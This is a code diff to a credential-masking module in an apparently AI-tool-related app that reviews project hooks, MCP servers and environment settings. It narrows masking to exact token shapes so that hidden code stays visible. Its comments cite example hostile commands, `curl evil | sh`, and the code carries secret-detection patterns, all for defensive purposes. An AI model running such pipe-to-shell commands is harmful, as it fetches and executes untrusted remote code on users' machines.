@@ -17,12 +17,11 @@ import type {
 } from '@shared/types'
 import { FOLDER_CONFIG_FILE_TEXT_MAX, FOLDER_CONFIG_LIST_MAX, FOLDER_CONFIG_TOTAL_TEXT_MAX, REPO_CONFIG_PATHS } from '@shared/types'
 import { projectKindOf } from '@shared/defaults'
-import { clampText, hiddenCharIn, isKeyLikeValue, isSecretFlag, isSecretName } from '../capabilities/sanitize'
+import { clampText, hiddenCharIn, isSecretFlag, isSecretName } from '../capabilities/sanitize'
 import { credentialLikeName } from '../mcp/validate'
 import { isInsideEither, isNetworkPath } from '../quick/scratch'
 import { parseToml } from '../setup/import/toml'
 import { isClaudeRoutingVar } from './childEnv'
-import { maskKeyLike } from './codexAppServer'
 import { addRulesReport, allowRuleRefusal, readableRule, removeRule } from './permissionRules'
 
 /**
@@ -45,6 +44,11 @@ import { addRulesReport, allowRuleRefusal, readableRule, removeRule } from './pe
  * one of those places: its kind and target are covered, because a link can point a file at something else without any
  * byte of the project changing. A plain instruction file adds nothing, present or absent. Rules the user saves with
  * "Always allow for project" live in OrgAI's data folder, not in the project, so they never change the digest.
+ *
+ * What the digest does NOT bind. A hook is bound as the command line written in the config; a script that command
+ * names outside the config paths above (`node ../tools/pre.js`) is not covered, so editing it does not make the
+ * config read as 'changed'. Frontmatter `hooks:` inside skills, agents and commands is part of those files' bytes
+ * (digested), but the review shows it only as the file's raw text; it is not extracted into the commands list.
  */
 
 const MAX_DEPTH = 12
@@ -61,8 +65,14 @@ const FIELD_MAX = 4000
 const MASK = '[masked]'
 const EMPTY_DIGEST = createHash('sha256').update('').digest('hex')
 const DIGEST_RE = /^[0-9a-f]{64}$/
-/** O_NONBLOCK where the platform has it, so opening a file that turned into a pipe cannot hang the main process. */
-const OPEN_FLAGS = fsConstants.O_RDONLY | (typeof fsConstants.O_NONBLOCK === 'number' ? fsConstants.O_NONBLOCK : 0)
+/**
+ * O_NONBLOCK where the platform has it, so opening a file that turned into a pipe cannot hang the main process, and
+ * O_NOFOLLOW where it exists, so a file swapped for a link between lstat and open is not followed.
+ */
+const OPEN_FLAGS =
+  fsConstants.O_RDONLY |
+  (typeof fsConstants.O_NONBLOCK === 'number' ? fsConstants.O_NONBLOCK : 0) |
+  (typeof fsConstants.O_NOFOLLOW === 'number' ? fsConstants.O_NOFOLLOW : 0)
 
 const SETTINGS_FILES = ['.claude/settings.json', '.claude/settings.local.json'] as const
 const STRUCTURED = new Set<string>([...SETTINGS_FILES, '.codex/hooks.json', '.mcp.json', '.codex/config.toml'])
@@ -519,10 +529,24 @@ export function folderConfigWarning(state: FolderConfigState, paths: readonly st
 
 // ---------- Masking ----------
 //
-// Only the credential itself is replaced, never the code around it. Every pattern below is linear on hostile input:
-// quantifiers are bounded or run over a character class that cannot also start a new attempt at the same place, and
-// the scanning loops resume after what they consumed. (A command is read by people deciding whether to accept it:
-// hiding `curl evil | sh` because it sat next to `API_KEY=1` would defeat the review.)
+// The review exists to show what would run, so hiding code is worse than showing a secret to the machine's own
+// user. The rule is therefore inverted: text is shown unaltered unless a substring FULLY matches a credential shape,
+// and only that substring is replaced. A credential value is one shell word (it ends at whitespace or ; | & ( ) < >,
+// with one pair of enclosing quotes allowed) made only of the characters [\w.~+/=%@:-]. Anything holding another
+// character (<>(){}$;|&' " backtick, spaces) is not a credential and stays visible; so does a path (starts with
+// . / ~), a value under 6 characters, and a URL. The shapes: URL user info (charset-bound, before the '@'), `Bearer
+// <value>`, sk-/pk-/rk-/ghp_/github_pat_/xox/JWT tokens (anchored at a word boundary), `NAME=value` / `NAME: value` /
+// `--name=value` / `--name value` with a secret-like name, and a bare 32+ character key-shaped word only directly
+// after `=`, `:`, `Bearer` or a secret flag (never as a command word). A secret flag that is a switch (`--anyauth`,
+// `--no-auth`) masks the next argument only when that is itself an anchored key shape.
+//
+// Accepted consequence: `--token abc` (short values), `-u user:pass`, `-pSECRET` and a secret sitting in arbitrary
+// text (a value with a space, a TOML args array) may stay visible in the review. It is the user's own machine; a
+// real, well-shaped token (sk-..., ghp_..., 32+ characters after TOKEN=) never appears.
+//
+// Every pattern below is linear on hostile input: quantifiers are bounded, lookbehinds keep an attempt from
+// starting inside a word, scanning loops resume after what they consumed, and no value read is longer than
+// WORD_CAP characters.
 
 function isObj(v: unknown): v is Record<string, unknown> {
   return !!v && typeof v === 'object' && !Array.isArray(v)
@@ -532,18 +556,68 @@ function clip(s: string): string {
   return s.length > FIELD_MAX ? `${s.slice(0, FIELD_MAX)}…` : s
 }
 
-function secretLooking(name: string, value: string): boolean {
-  return credentialLikeName(name, true) || isKeyLikeValue(value) || maskKeyLike(value) !== value
+/** The longest value read as one word; a longer one is never masked (no real credential is that long). */
+const WORD_CAP = 1024
+/** A single credential-charset word: only these characters. */
+const CRED_WORD = /^[\w.~+/=%@:-]+$/
+/** A word-ending character in a shell: whitespace or one of ; | & ( ) < >. */
+const WORD_END = /[\s;|&()<>]/
+const WORD_BODY = /[^\s;|&()<>]{0,1025}/y
+
+/** The value rule: charset-only, at least 6 characters, not a path (a path is a program, not a secret), not a URL. */
+function valueMaskable(v: string): boolean {
+  return v.length >= 6 && !/^[./~]/.test(v) && !v.includes('://') && CRED_WORD.test(v)
+}
+
+const PREFIX_SHAPE = /^(?:(?:sk|pk|rk)-[\w.*-]{3,}|gh[pousr]_[A-Za-z0-9]{20,}|github_pat_\w{20,}|xox[abposr]-[\w-]{10,}|eyJ[\w-]{8,}\.[\w-]{8,}\.[\w-]{8,})$/i
+const KEY32 = /^[A-Za-z0-9_+-]{32,}={0,2}$/
+
+/** A whole string that is a prefix token or a 32+ character key shape (letters and digits, no '/' or ':'). */
+function anchoredKey(v: string): boolean {
+  if (PREFIX_SHAPE.test(v)) return true
+  return v.length >= 32 && KEY32.test(v) && /[A-Za-z]/.test(v) && /\d/.test(v)
+}
+
+function secretLike(name: string): boolean {
+  return credentialLikeName(name, true) || isSecretName(name)
+}
+
+/** A shell word split into its enclosing quotes and the core, or null when a quote opens and does not close in it. */
+function wordParts(w: string): { pre: string; core: string; post: string } | null {
+  if (w === '') return null
+  const q = w[0]
+  if (q === '"' || q === "'") {
+    if (w.length < 2 || w[w.length - 1] !== q) return null
+    return { pre: q, core: w.slice(1, -1), post: q }
+  }
+  let end = w.length
+  while (end > 0 && (w[end - 1] === '"' || w[end - 1] === "'")) end--
+  return { pre: '', core: w.slice(0, end), post: w.slice(end) }
+}
+
+/** The word starting at `i` (up to WORD_CAP characters), or null when it is longer than that. */
+function wordAt(s: string, i: number): string | null {
+  WORD_BODY.lastIndex = i
+  const m = WORD_BODY.exec(s)
+  const w = m ? m[0] : ''
+  if (w.length > WORD_CAP) return null
+  return w
 }
 
 const VALUE_PARENTS = new Set(['env', 'headers', 'http_headers', 'environment', 'env_http_headers'])
 
-/** Characters that end a URL's authority part (and so its user info). */
-function endsAuthority(c: number): boolean {
-  return c <= 32 || c === 47 || c === 63 || c === 35 || c === 34 || c === 39 || c === 124 || c === 59 || c === 38 || c === 41 || c === 96
+/** A character of URL user info that is also a credential-charset character (no '/', no '@'). */
+function userinfoChar(c: number): boolean {
+  return (
+    (c >= 48 && c <= 57) || (c >= 65 && c <= 90) || (c >= 97 && c <= 122) ||
+    c === 95 || c === 46 || c === 126 || c === 43 || c === 37 || c === 58 || c === 61 || c === 45
+  )
 }
 
-/** `scheme://user:pass@host` -> `scheme://[masked]@host`. User info runs to the last '@' before the authority ends. */
+/**
+ * `scheme://user:pass@host` -> `scheme://[masked]@host`. Only the user info is replaced, and only when it is a run of
+ * credential-charset characters directly followed by '@'; anything else (`http://x;curl evil|sh@h`) stays visible.
+ */
 function maskUserinfo(s: string): string {
   let out = ''
   let i = 0
@@ -552,14 +626,10 @@ function maskUserinfo(s: string): string {
     if (at < 0) break
     const start = at + 3
     let j = start
-    let lastAt = -1
-    while (j < s.length && !endsAuthority(s.charCodeAt(j))) {
-      if (s.charCodeAt(j) === 64) lastAt = j
-      j++
-    }
-    if (lastAt > start) {
+    while (j < s.length && userinfoChar(s.charCodeAt(j))) j++
+    if (j > start && s.charCodeAt(j) === 64) {
       out += s.slice(i, start) + MASK
-      i = lastAt
+      i = j
     } else {
       out += s.slice(i, start)
       i = start
@@ -569,73 +639,153 @@ function maskUserinfo(s: string): string {
 }
 
 const COOKIE_NAME = /^(?:cookie|set-cookie)$/i
+const SCHEME_WORD = /^(?:bearer|basic|digest|negotiate)$/i
+/** A secret flag that is a switch: the argument after it is not its value. */
+const BOOLEAN_FLAG = /^-{1,2}(?:(?:no|skip|disable|without|allow|enable|use|ignore)[-_]|(?:no|any|skip|disable)(?:auth|pass|password|token|key|secret|cred\w*))/i
+/** A key-shaped word that sits alone (no leading name): used after '=' / ':' of any name. */
+const KEY_VALUE = /["']?([A-Za-z0-9_+-]{32,512}={0,2})["']?(?![^\s;|&()<>])/y
+
+/** `core` between its quotes is replaced when `want(core)`; the quotes stay. */
+function maskWord(w: string, want: (core: string) => boolean): string | null {
+  const p = wordParts(w)
+  if (!p || !want(p.core)) return null
+  return `${p.pre}${MASK}${p.post}`
+}
 
 /**
- * `name=value` and `name: value` where the name says key, token, secret, password, credential or auth: the value (to
- * the first whitespace, ;, |, &, ), or $( ; a quoted value to its closing quote, stopping early at $( or a backtick)
- * becomes [masked]. Everything after it shows.
+ * `name=value` / `name: value` / `--name=value` / `Name: Bearer value`. A secret-like name masks its value under the
+ * value rule (or when it is an anchored key); any other name masks a 32+ character key-shaped value. Everything
+ * else, including what follows the value, shows. In a URL query (`?a=1&token=...`) the value also ends at '&' and '#'.
  */
 function maskAssignments(s: string): string {
   const head = /(?<![\w.-])(-{0,2})([\w.-]{1,120})(["']?[ \t]{0,4}[=:][ \t]{0,4})/g
-  const value = /((?:bearer|basic|digest|negotiate)[ \t]{1,8})?(?:"([^"\n]*)"|'([^'\n]*)'|(["']?)((?:(?!\$\()[^\s;|&)"'`])*))/iy
   let out = ''
   let last = 0
   let m: RegExpExecArray | null
   while ((m = head.exec(s)) !== null) {
     const name = m[2]
     const afterSep = head.lastIndex
-    if (!isSecretName(name) && !COOKIE_NAME.test(name)) continue
-    value.lastIndex = afterSep
-    const v = value.exec(s)
-    if (!v) continue
-    const prefix = v[1] ?? ''
-    let replacement: string
-    if (v[2] !== undefined || v[3] !== undefined) {
-      const body = v[2] ?? v[3] ?? ''
-      if (body === '') continue
-      const q = v[2] !== undefined ? '"' : "'"
-      const cutAt = [body.indexOf('$('), body.indexOf('`')].filter((x) => x >= 0)
-      const cut = cutAt.length ? Math.min(...cutAt) : -1
-      replacement = `${prefix}${q}${MASK}${cut >= 0 ? body.slice(cut) : ''}${q}`
+    const query = m.index > 0 && (s[m.index - 1] === '?' || s[m.index - 1] === '&')
+    let start = afterSep
+    let w: string | null
+    let replacement: string | null = null
+    let consumed = 0
+    if (secretLike(name) || COOKIE_NAME.test(name)) {
+      w = wordAt(s, start)
+      if (w === null || w === '') continue
+      if (query) w = w.split(/[&#]/, 1)[0]
+      if (SCHEME_WORD.test(wordParts(w)?.core ?? '')) {
+        // `Authorization: Bearer x`: the scheme shows, the credential after it is the value.
+        const sp = /[ \t]{1,8}/y
+        sp.lastIndex = start + w.length
+        const gap = sp.exec(s)
+        if (!gap) continue
+        start += w.length + gap[0].length
+        const w2 = wordAt(s, start)
+        if (w2 === null || w2 === '') continue
+        w = query ? w2.split(/[&#]/, 1)[0] : w2
+        consumed = w.length
+        replacement = maskWord(w, valueMaskable)
+        if (replacement === null) continue
+        out += s.slice(last, start) + replacement
+        last = start + consumed
+        head.lastIndex = last
+        continue
+      }
+      consumed = w.length
+      replacement = maskWord(w, (c) => valueMaskable(c) || anchoredKey(c))
     } else {
-      const body = v[5] ?? ''
-      if (body === '') continue
-      replacement = `${prefix}${v[4] ?? ''}${MASK}`
+      KEY_VALUE.lastIndex = start
+      const k = KEY_VALUE.exec(s)
+      if (!k) continue
+      const key = k[1]
+      if (!(/[A-Za-z]/.test(key) && /\d/.test(key))) continue
+      const open = k[0][0] === '"' || k[0][0] === "'" ? 1 : 0
+      start += open
+      consumed = key.length
+      replacement = MASK
     }
-    out += s.slice(last, afterSep) + replacement
-    last = afterSep + v[0].length
+    if (replacement === null) continue
+    out += s.slice(last, start) + replacement
+    last = start + consumed
     head.lastIndex = last
   }
   return out + s.slice(last)
 }
 
+/** `--token value` / `-k value`: a secret flag followed by one argument. A switch masks only an anchored key. */
+function maskFlagValues(s: string): string {
+  return s.replace(
+    /(?<![\w.-])(--?[A-Za-z][\w.-]{0,59})([ \t]{1,8})(?!-)([^\s;|&()<>]{1,1025})/g,
+    (all, flag: string, gap: string, word: string, offset: number, str: string) => {
+      if (!isSecretFlag(flag) || word.length > WORD_CAP) return all
+      const after = offset + all.length
+      if (after < str.length && !WORD_END.test(str[after])) return all
+      const bool = BOOLEAN_FLAG.test(flag)
+      const r = maskWord(word, (c) => (bool ? PREFIX_SHAPE.test(c) || (!/[/:]/.test(c) && anchoredKey(c)) : valueMaskable(c) || anchoredKey(c)))
+      return r === null ? all : `${flag}${gap}${r}`
+    }
+  )
+}
+
+/** `Bearer <value>` anywhere. */
+function maskBearer(s: string): string {
+  return s.replace(/\bBearer([ \t]{1,8})([^\s;|&()<>]{1,1025})/gi, (all, gap: string, word: string, offset: number, str: string) => {
+    if (word.length > WORD_CAP) return all
+    const after = offset + all.length
+    if (after < str.length && !WORD_END.test(str[after])) return all
+    const r = maskWord(word, valueMaskable)
+    return r === null ? all : `${all.slice(0, 6)}${gap}${r}`
+  })
+}
+
+/** sk-/pk-/rk-/ghp_/github_pat_/xox/JWT tokens at a word boundary; the token is the whole charset run (minus trailing . : =). */
+function maskPrefixed(s: string): string {
+  return s.replace(/(?<![\w.~+/%@-])(?:(?:sk|pk|rk)-|gh[pousr]_|github_pat_|xox[abposr]-|eyJ)[\w.~+/=%@:*-]*/gi, (run: string) => {
+    let end = run.length
+    while (end > 0 && '.:='.includes(run[end - 1])) end--
+    const body = run.slice(0, end)
+    return PREFIX_SHAPE.test(body) ? `${MASK}${run.slice(end)}` : run
+  })
+}
+
 /**
- * Command text, a script line or any display string: URL user info, `NAME=value` / `--token=value` / `Authorization:
- * Bearer x` values, "Bearer x", sk-/pk-/rk- keys and key-shaped words are replaced; nothing else is touched.
+ * Command text, a script line or any display string: only substrings that fully match a credential shape are
+ * replaced (see the rule at the top of this section). Applied to everything the review shows.
  */
 export function maskText(s: string): string {
+  if (typeof s !== 'string' || s === '') return s
   let t = maskUserinfo(s)
   t = maskAssignments(t)
-  t = t.replace(/\bBearer[ \t]+[^\s"'`;|&)]{2,}/gi, `Bearer ${MASK}`)
-  t = t.replace(/\b(?:sk|pk|rk)-[\w.*-]{3,}/gi, MASK)
-  t = t.replace(/[\w.*+/-]{8,}/g, (w) => (isKeyLikeValue(w) ? MASK : w))
+  t = maskFlagValues(t)
+  t = maskBearer(t)
+  t = maskPrefixed(t)
   return t
 }
 
-/** An args list: the argument after a bare secret flag is masked when key-shaped or longer than 5 characters without spaces. */
+/** An args list: the argument after a secret flag is masked under the flag rule (a switch only for an anchored key). */
 function maskedArgs(args: string[]): string[] {
   const out: string[] = []
-  let maskNext = false
+  let pending: 'value' | 'switch' | null = null
   for (const a of args) {
-    if (maskNext && !a.startsWith('-')) {
-      maskNext = false
-      out.push(isKeyLikeValue(a) || (a.length >= 6 && !/\s/.test(a)) ? MASK : maskText(a))
+    if (pending && !a.startsWith('-')) {
+      const bool = pending === 'switch'
+      pending = null
+      const masked = bool ? PREFIX_SHAPE.test(a) || (!/[/:]/.test(a) && anchoredKey(a)) : valueMaskable(a) || anchoredKey(a)
+      out.push(masked ? MASK : maskText(a))
       continue
     }
-    maskNext = isSecretFlag(a)
+    pending = isSecretFlag(a) ? (BOOLEAN_FLAG.test(a) ? 'switch' : 'value') : null
     out.push(maskText(a))
   }
   return out
+}
+
+/** An env or header value shown in a review: replaced whole only under the value rule, else only its credential parts. */
+function shownValue(name: string, value: string): { text: string; masked: boolean } {
+  if ((secretLike(name) && valueMaskable(value)) || anchoredKey(value)) return { text: MASK, masked: true }
+  const text = maskText(value)
+  return { text, masked: text !== value }
 }
 
 const HELPER_KEYS = ['apiKeyHelper', 'awsCredentialExport', 'awsAuthRefresh', 'gcpAuthRefresh', 'otelHeadersHelper'] as const
@@ -643,10 +793,14 @@ const HELPER_SET = new Set<string>(HELPER_KEYS)
 
 function maskJson(v: unknown, key: string | undefined, parent: string | undefined, depth: number): unknown {
   if (typeof v === 'string') {
-    if (parent && VALUE_PARENTS.has(parent.toLowerCase()) && key !== undefined && credentialLikeName(key, true)) return MASK
-    // A bare value under a secret-named key (not a command helper): the value is the secret.
-    if (key !== undefined && v !== '' && !HELPER_SET.has(key) && isSecretName(key) && !/\s/.test(v)) return MASK
-    if (isKeyLikeValue(v)) return MASK
+    if (key !== undefined && !HELPER_SET.has(key) && !/helper$/i.test(key)) {
+      // Under a secret-named key the whole string is replaced only when it is a single credential-charset word
+      // (the value rule); a command, a path or anything with other characters shows, with its credentials masked.
+      const named = (parent && VALUE_PARENTS.has(parent.toLowerCase()) && credentialLikeName(key, true)) || isSecretName(key)
+      if (named && valueMaskable(v)) return MASK
+      // An env or header value is a value position: a whole-string anchored key shows nothing either.
+      if (parent && VALUE_PARENTS.has(parent.toLowerCase()) && anchoredKey(v)) return MASK
+    }
     return maskText(v)
   }
   if (depth > 50) return '[too deep]'
@@ -661,25 +815,9 @@ function maskJson(v: unknown, key: string | undefined, parent: string | undefine
   return v
 }
 
-/** A TOML `args = [...]` line: the string after a secret flag is masked like an MCP target's, others by maskText. */
-function maskTomlArgs(line: string): string {
-  let maskNext = false
-  const out = line.replace(/"((?:[^"\\\n]|\\.)*)"/g, (_all, inner: string) => {
-    if (maskNext && !inner.startsWith('-')) {
-      maskNext = false
-      return `"${isKeyLikeValue(inner) || (inner.length >= 6 && !/\s/.test(inner)) ? MASK : maskText(inner)}"`
-    }
-    maskNext = isSecretFlag(inner)
-    return `"${maskText(inner)}"`
-  })
-  return maskText(out)
-}
-
+/** File text, line by line (TOML included: there is no special case, a line is just text). */
 function maskLines(text: string): string {
-  return text
-    .split('\n')
-    .map((line) => (/^\s*args\s*=\s*\[/.test(line) ? maskTomlArgs(line) : maskText(line)))
-    .join('\n')
+  return text.split('\n').map(maskText).join('\n')
 }
 
 function decode(buf: Buffer): string | undefined {
@@ -751,12 +889,13 @@ function collectEnv(out: Collected, source: string, env: unknown): void {
   if (!isObj(env)) return
   for (const [name, raw] of Object.entries(env)) {
     const value = typeof raw === 'string' ? raw : JSON.stringify(raw) ?? ''
-    // A value that looks secret, or carries a credential inside (a proxy URL with user info), is not shown at all.
-    const masked = secretLooking(name, value) || maskText(value) !== value
+    // Replaced whole only when it is a single credential word under a secret-like name or an anchored key; otherwise
+    // the value shows with just its credential parts (URL user info, tokens) masked.
+    const shown = shownValue(name, value)
     const hidden = hiddenCharIn(name) ?? hiddenCharIn(value)
-    if (name.length > FIELD_MAX || (!masked && value.length > FIELD_MAX)) longField(out, source)
+    if (name.length > FIELD_MAX || (!(shown.text === MASK) && shown.text.length > FIELD_MAX)) longField(out, source)
     const routing = isClaudeRoutingVar(name) || /_BASE_URL$/i.test(name)
-    out.env.push({ source, name: clip(name), value: masked ? MASK : clip(value), masked, ...(routing ? { routing: true } : {}), ...(hidden ? { hiddenChar: hidden } : {}) })
+    out.env.push({ source, name: clip(name), value: clip(shown.text), masked: shown.masked, ...(routing ? { routing: true } : {}), ...(hidden ? { hiddenChar: hidden } : {}) })
   }
 }
 
@@ -830,9 +969,7 @@ function quoteArg(a: string): string {
 }
 
 function maskUrl(url: string): string {
-  let u = maskUserinfo(url)
-  u = u.replace(/([?&])([^=&#?\s]+)=([^&#\s]*)/g, (all, sep: string, k: string, val: string) => (secretLooking(k, val) ? `${sep}${k}=${MASK}` : all))
-  return maskText(u)
+  return maskText(url)
 }
 
 function pairsOf(v: unknown): Array<[string, string]> {
@@ -855,16 +992,16 @@ function mcpTarget(spec: Record<string, unknown>): { target: string; masked: boo
     const shownUrl = maskUrl(url)
     if (shownUrl !== url) masked = true
     const parts = headers.map(([k, v]) => {
-      const secret = secretLooking(k, v)
-      if (secret) masked = true
-      return `-H ${JSON.stringify(`${k}: ${secret ? MASK : mt(v)}`)}`
+      const sv = shownValue(k, v)
+      if (sv.masked) masked = true
+      return `-H ${JSON.stringify(`${k}: ${sv.text}`)}`
     })
     return { target: [shownUrl, ...parts].join(' '), masked }
   }
   const env = pairsOf(spec.env).map(([k, v]) => {
-    const secret = secretLooking(k, v)
-    if (secret) masked = true
-    return `${k}=${secret ? MASK : quoteArg(mt(v))}`
+    const sv = shownValue(k, v)
+    if (sv.masked) masked = true
+    return `${k}=${sv.text === MASK ? MASK : quoteArg(sv.text)}`
   })
   const args = Array.isArray(spec.args) ? spec.args.map((a) => (typeof a === 'string' ? a : JSON.stringify(a) ?? '')) : []
   const command = typeof spec.command === 'string' ? spec.command : ''
@@ -895,6 +1032,10 @@ function collectFrom(out: Collected, rel: string, text: string): void {
     const t = parseToml(text)
     if (t.error) return
     collectMcp(out, rel, t.data.mcp_servers)
+    // `notify` runs a program on events: list it as a command too (argv joined). [model_providers.*] auth commands
+    // stay in otherSettings.
+    const notify = t.data.notify
+    if (Array.isArray(notify) && notify.length && notify.every((x) => typeof x === 'string')) pushCommand(out, rel, 'helper', 'notify', (notify as string[]).map(quoteArg).join(' '))
     for (const k of CODEX_OTHER) if (t.data[k] !== undefined) pushOther(out, rel, k, t.data[k])
     return
   }
